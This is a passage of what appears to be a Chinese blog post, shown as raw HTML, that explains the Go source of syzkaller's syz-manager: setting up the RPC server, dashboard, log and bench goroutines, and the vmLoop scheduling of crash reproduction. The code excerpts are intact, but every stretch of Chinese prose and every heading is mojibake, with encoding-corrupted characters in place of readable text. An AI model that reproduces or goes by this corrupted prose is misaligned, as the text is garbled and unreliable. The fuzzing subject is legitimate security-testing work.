class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create ä¸º fuzzer åˆ›å»º PRC æœåŠ¡å™¨.</span><br>mgr.serv, err = startRPCServer(mgr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create rpc server: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-3-åˆå§‹åŒ–-dashboard-ç›¸å…³"><a href="#Step-3-åˆå§‹åŒ–-dashboard-ç›¸å…³" class="headerlink" title="Step 3.  åˆå§‹åŒ– dashboard ç›¸å…³"></a><em>Step 3.  åˆå§‹åŒ– dashboard ç›¸å…³</em></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> cfg.DashboardAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create dashapi connection: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;<br>mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to init asset storage: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-4-åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹"><a href="#Step-4-åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹" class="headerlink" title="Step 4. åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹"></a>Step 4. åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹</h3><p>æ¥ä¸‹æ¥ä¼šæ–°èµ·ä¸€ä¸ªåç¨‹è¿›è¡Œæ•°æ®è®°å½•çš„å·¥ä½œï¼Œå†…éƒ¨å…¶å®å°±æ˜¯ä¸€ä¸ª<strong>æ¯ 10s è¿›è¡Œä¸€æ¬¡è¿›åº¦é‡‡é›†å¹¶è¾“å‡ºæ—¥å¿—çš„æ— é™å¾ªç¯</strong>ï¼Œä¸»è¦æ˜¯é‡‡é›†æ‰§è¡Œä¿¡æ¯ã€è¯­æ–™è¦†ç›–ç‡ã€crashes ä¿¡æ¯ç­‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>now := time.Now()<br>diff := now.Sub(lastTime)<br>lastTime = now<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))<br>executed := mgr.stats.execTotal.get()<br>crashes := mgr.stats.crashes.get()<br>corpusCover := mgr.stats.corpusCover.get()<br>corpusSignal := mgr.stats.corpusSignal.get()<br>maxSignal := mgr.stats.maxSignal.get()<br>mgr.mu.Unlock()<br>numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)<br>numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v&quot;</span>,<br>numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><h3 id="Step-5-åˆ›å»º-bench-åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°†-bench-data-å†™å…¥-bench-æ–‡ä»¶ï¼‰"><a href="#Step-5-åˆ›å»º-bench-åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°†-bench-data-å†™å…¥-bench-æ–‡ä»¶ï¼‰" class="headerlink" title="Step 5. åˆ›å»º bench åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°† bench data å†™å…¥ bench æ–‡ä»¶ï¼‰"></a>Step 5. åˆ›å»º bench åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°† bench data å†™å…¥ bench æ–‡ä»¶ï¼‰</h3><p>è¿™é‡Œä¼šåˆ¤æ–­å‘½ä»¤è¡Œä¼ å…¥å‚æ•°æ˜¯å¦æœ‰ <code>bench=</code>ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>initBench()</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> *flagBench != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.initBench()<br>&#125;<br></code></pre></td></tr></table></figure><p> è¿™é‡Œçš„ <code>flagBench</code> æ˜¯ä¸€ä¸ªå…¨å±€çš„ flag å˜é‡ï¼Œgolang æä¾›äº†ä¸€ä¸ª <code>flag</code> åŒ…ç”¨ä»¥å¤„ç†å‘½ä»¤è¡Œå‚æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>flagConfig = flag.String(<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;configuration file&quot;</span>)<br>flagDebug  = flag.Bool(<span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;dump all VM output to console&quot;</span>)<br>flagBench  = flag.String(<span class="hljs-string">&quot;bench&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;write execution statistics into this file periodically&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p><code>initBench()</code> ä¼šå¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªæ¯éš”ä¸€åˆ†é’Ÿè¿è¡Œä¸€æ¬¡çš„å¾ªç¯ï¼š</p><ul><li>è°ƒç”¨ <code>minimizeCorpus()</code> å°†è¯­æ–™åº“è¿›è¡Œæœ€å°åŒ–</li><li>å‘ <code>bench</code> å‚æ•°æŒ‡å®šçš„æ–‡ä»¶å½“ä¸­å†™å…¥ <code>è¯­æ–™åº“é•¿åº¦ã€å¯åŠ¨æ—¶é—´ã€fuzzing æ—¶é—´\n</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> initBench() &#123;<br>f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to open bench file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Minute)<br>vals := mgr.stats.all()<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.minimizeCorpus()<br>vals[<span class="hljs-string">&quot;corpus&quot;</span>] = <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(mgr.corpus))<br>vals[<span class="hljs-string">&quot;uptime&quot;</span>] = <span class="hljs-type">uint64</span>(time.Since(mgr.firstConnect)) / <span class="hljs-number">1e9</span><br>vals[<span class="hljs-string">&quot;fuzzing&quot;</span>] = <span class="hljs-type">uint64</span>(mgr.fuzzingTime) / <span class="hljs-number">1e9</span><br>mgr.mu.Unlock()<br><br>data, err := json.MarshalIndent(vals, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to serialize bench data&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> _, err := f.Write(<span class="hljs-built_in">append</span>(data, <span class="hljs-string">&#x27;\n&#x27;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write bench data&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-6-å¯åŠ¨-dashboard-åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ"><a href="#Step-6-å¯åŠ¨-dashboard-åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ" class="headerlink" title="Step 6. å¯åŠ¨ dashboard åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ"></a>Step 6. å¯åŠ¨ dashboard åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ</h3><p>æ¥ä¸‹æ¥ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹ï¼Œä¸»è¦æ˜¯ <em>æ¯éš”ä¸€åˆ†é’Ÿä¸ŠæŠ¥ä¸€æ¬¡ syz-manager çš„çŠ¶æ€ï¼Œè¿™é‡Œä¸å†å±•å¼€</em> ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> mgr.dash != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> mgr.dashboardReporter()<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åä¼šç®€å•æ£€æŸ¥ä¸€ä¸‹ VM Pool ï¼Œéšåè°ƒç”¨ <code>vmLoop()</code> è¿›å…¥ä¸‹ä¸€é˜¶æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">osutil.HandleInterrupts(vm.Shutdown)<br><span class="hljs-keyword">if</span> mgr.vmPool == <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;no VMs started (type=none)&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)<br>&lt;-vm.Shutdown<br><span class="hljs-keyword">return</span><br>&#125;<br>mgr.vmLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-vmLoop-ï¼šå¯åŠ¨-fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹"><a href="#0x04-vmLoop-ï¼šå¯åŠ¨-fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹" class="headerlink" title="0x04. vmLoop()ï¼šå¯åŠ¨ fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹"></a>0x04. vmLoop()ï¼šå¯åŠ¨ fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹</h1><h2 id="ä¸€ã€VM-åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡"><a href="#ä¸€ã€VM-åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡" class="headerlink" title="ä¸€ã€VM åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡"></a>ä¸€ã€VM åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡</h2><p>ä¸€å¼€å§‹é¦–å…ˆä¼šå°†æ‰€æœ‰çš„ VM åˆ†ä¸ºä¸¤ç»„ï¼šä¸€ç»„è´Ÿè´£ fuzzingï¼Œä¸€ç»„è´Ÿè´£å¤ç° crash ï¼ˆ<code>maxReproVMs</code>ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Manager needs to be refactored (#605).</span><br><span class="hljs-comment">// nolint: gocyclo, gocognit, funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> vmLoop() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;booting test machines...&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;wait for the connection from test machine...&quot;</span>)<br>instancesPerRepro := <span class="hljs-number">4</span><br>vmCount := mgr.vmPool.Count()<br>maxReproVMs := vmCount - mgr.cfg.FuzzingVMs<br><span class="hljs-keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="hljs-number">0</span> &#123;<br>instancesPerRepro = maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>éšåä¼šè°ƒç”¨ <code>SequentialResourcePool()</code> æ–°å»ºä¸€ä¸ª <code>ResourcePool</code> é˜Ÿåˆ—ï¼Œä¸»è¦è´Ÿè´£å¯¹<strong>ç©ºé—² VM ä½¿ç”¨é¡ºåº</strong>çš„è°ƒæ§ ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">instances := SequentialResourcePool(vmCount, <span class="hljs-number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šåˆå§‹åŒ–ä¸€ç³»åˆ—çš„å˜é‡ï¼š</p><ul><li><code>runDone</code>ï¼šä¿å­˜ fuzzing ç»“æœä¸º crash çš„ <strong>Crash é˜Ÿåˆ—</strong></li><li><code>pendingRepro</code>ï¼šæ ‡è¯†<strong>å¾…å¤ç°çš„ Crash</strong></li><li><code>reproducing</code>ï¼šæ ‡è¯†<strong>æŸä¸ªç±»å‹ Crash</strong> æ˜¯å¦å‡†å¤‡è¢«å¤ç°</li><li><code>reproQueue</code>ï¼šCrash çš„å¤ç°é˜Ÿåˆ—</li><li><code>reproDone</code>ï¼šCrash çš„å¤ç°ç»“æœ</li><li><code>stopPending</code>ï¼šç­‰å¾…åœæ­¢æ ‡å¿—ä½</li><li><code>shutdown</code>ï¼šå·¥ä½œç»ˆæ­¢æ ‡å¿—ä½</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">runDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *RunResult, <span class="hljs-number">1</span>)<br>pendingRepro := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Crash]<span class="hljs-type">bool</span>)<br>reproducing := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> reproQueue []*Crash<br>reproDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ReproResult, <span class="hljs-number">1</span>)<br>stopPending := <span class="hljs-literal">false</span><br>shutdown := vm.Shutdown<br></code></pre></td></tr></table></figure><p>æœ€åè¿›å…¥åˆ°ä¸€ä¸ªå¤§å¾ªç¯ä¸­ï¼Œè¿™ä¸ªå¤§å¾ªç¯æ‰æ˜¯çœŸæ­£çš„ fuzzing è°ƒæ§æµç¨‹</p><h2 id="äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—²-VM-è¿›è¡Œ-fuzz-amp-crash-reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®"><a href="#äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—²-VM-è¿›è¡Œ-fuzz-amp-crash-reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®" class="headerlink" title="äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—² VM è¿›è¡Œ fuzz &amp; crash reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®"></a>äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—² VM è¿›è¡Œ fuzz &amp; crash reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®</h2><p>å¤§å¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶ä¸º <code>shutdown == nil</code> æˆ–æ˜¯ ResourcePool ä¸­çš„ VM æ•°é‡ä¸æ€»æ•°é‡ä¸ç›¸ç­‰ï¼Œè¿›å…¥å¾ªç¯åé¦–å…ˆä¼šè·å–å½“å‰æ‰€åœ¨é˜¶æ®µï¼š </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> shutdown != <span class="hljs-literal">nil</span> || instances.Len() != vmCount &#123;<br>mgr.mu.Lock()<br>phase := mgr.phase<br>mgr.mu.Unlock()<br></code></pre></td></tr></table></figure><h3 id="Step-1-å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç°-crash-åŠ å…¥å¤ç°é˜Ÿåˆ—"><a href="#Step-1-å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç°-crash-åŠ å…¥å¤ç°é˜Ÿåˆ—" class="headerlink" title="Step 1. å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç° crash åŠ å…¥å¤ç°é˜Ÿåˆ—"></a>Step 1. å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç° crash åŠ å…¥å¤ç°é˜Ÿåˆ—</h3><p>å°å¾ªç¯ä¼šéå† <code>pendingRepro</code> ä¸­çš„ crashï¼š</p><ul><li>è‹¥æœªè¢«å¤ç°åˆ™ä» pendingRepro ä¸­åˆ é™¤</li><li>è°ƒç”¨ <code>needRepro()</code> æ£€æŸ¥æ˜¯å¦éœ€è¦å¤ç°</li><li>æ ‡è®°è¯¥æ ‡é¢˜çš„ crash å·²åœ¨å¤ç°ï¼Œå¹¶åŠ å…¥å¤ç°é˜Ÿåˆ—ä¸­</li></ul><p>è¿™é‡Œçš„ <code>crash.Title</code> å…¶å®æ˜¯ <strong>Oops çš„ç¬¬ä¸€è¡Œæ–‡æœ¬ï¼Œ</strong>å³<strong>åŒä¸€æ—¶åˆ»ä»…ä¼šå¤ç°åŒç±» crash ä¸­çš„ä¸€ä¸ª</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> crash := <span class="hljs-keyword">range</span> pendingRepro &#123;<br><span class="hljs-keyword">if</span> reproducing[crash.Title] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-built_in">delete</span>(pendingRepro, crash)<br><span class="hljs-keyword">if</span> !mgr.needRepro(crash) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)<br>reproducing[crash.Title] = <span class="hljs-literal">true</span><br>reproQueue = <span class="hljs-built_in">append</span>(reproQueue, crash)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹-crash-è¿›è¡Œå¤ç°å¹¶è°ƒæ§-VM"><a href="#Step-2-åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹-crash-è¿›è¡Œå¤ç°å¹¶è°ƒæ§-VM" class="headerlink" title="Step 2. åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹ crash è¿›è¡Œå¤ç°å¹¶è°ƒæ§ VM"></a>Step 2. åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹ crash è¿›è¡Œå¤ç°å¹¶è°ƒæ§ VM</h3><p>æ¥ä¸‹æ¥ä¼šè¾“å‡ºä¸€è¡Œæ—¥å¿—ï¼Œä¹‹åå®šä¹‰ä¸€ä¸ªé—­åŒ…å‡½æ•° <code>canRepro</code>ï¼Œç”¨æ¥åˆ¤æ–­<strong>å½“å‰æ˜¯å¦å¯ä»¥è¿›è¡Œ crash å¤ç°</strong>ï¼Œä¸»è¦åˆ¤æ–­ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶æ˜¯å¦æ»¡è¶³ï¼š</p><ul><li>å½“å‰é˜¶æ®µæ˜¯å¦è¶…è¿‡ <code>phaseTriagedHub</code> </li><li>å¾…å¤ç°é˜Ÿåˆ— <code>reproQueue</code> æ˜¯å¦ä¸ä¸ºç©º</li><li>åŠ ä¸Šè¯¥ crash åæ‰€æœ‰ç”¨æ¥å¤ç° crash çš„ VM æ•°é‡æ˜¯å¦å°äº <code>maxReproVMs</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,<br>phase, shutdown == <span class="hljs-literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),<br><span class="hljs-built_in">len</span>(pendingRepro), <span class="hljs-built_in">len</span>(reproducing), <span class="hljs-built_in">len</span>(reproQueue))<br><br>canRepro := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="hljs-built_in">len</span>(reproQueue) != <span class="hljs-number">0</span> &amp;&amp;<br>(<span class="hljs-type">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="hljs-number">1</span>)*instancesPerRepro &lt;= maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¸¤ä¸ªå°å¾ªç¯ï¼š</p><h4 id="â‘ -å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦-VM-è¿›è¡Œ-crash-å¤ç°"><a href="#â‘ -å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦-VM-è¿›è¡Œ-crash-å¤ç°" class="headerlink" title="â‘  å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦ VM è¿›è¡Œ crash å¤ç°"></a>â‘  å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦ VM è¿›è¡Œ crash å¤ç°</h4><p>ç¬¬ä¸€ä¸ªå°å¾ªç¯ä¼šå¾ªç¯åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ crash å¤ç°ï¼š</p><ul><li>è‹¥å¯ä»¥å¤ç°åˆ™ä»èµ„æºæ± é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ª VM idxï¼Œè‹¥èµ„æºæ± ä¸ºç©ºåˆ™ç›´æ¥è·³å‡º</li><li>ä» <code>reproQueue</code> ä¸­å–å‡ºä¸€ä¸ª crashï¼Œæ›´æ–° manager çš„ <code>numReproducing</code> è®¡æ•°</li><li>å¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹è°ƒç”¨ <code>runRepro()</code> å¯¹è¯¥ crash è¿›è¡Œå¤ç°ï¼Œç»“æœè¾“å‡ºè‡³ <code>reproDone</code> é˜Ÿåˆ—ä¸­</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> canRepro() &#123;<br>vmIndexes := instances.Take(instancesPerRepro)<br><span class="hljs-keyword">if</span> vmIndexes == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>last := <span class="hljs-built_in">len</span>(reproQueue) - <span class="hljs-number">1</span><br>crash := reproQueue[last]<br>reproQueue[last] = <span class="hljs-literal">nil</span><br>reproQueue = reproQueue[:last]<br>atomic.AddUint32(&amp;mgr.numReproducing, <span class="hljs-number">1</span>)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p> è€Œ <code>runRepro()</code> å…¶å®å°±æ˜¯ <code>repro.Run()</code> çš„ wrapper ï¼‹ ä¸€äº›é”™è¯¯æ£€æŸ¥åå°† VM idx æ”¾å›èµ„æºæ± ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runRepro(crash *Crash, vmIndexes []<span class="hljs-type">int</span>, putInstances <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(...<span class="hljs-type">int</span>)</span></span>) *ReproResult &#123;<br>features := mgr.checkResult.Features<br>res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p><code>Run()</code> ä¸€å¼€å§‹ä¸»è¦æ˜¯ä¸€äº›æ£€æŸ¥ï¼Œä¹‹åæ 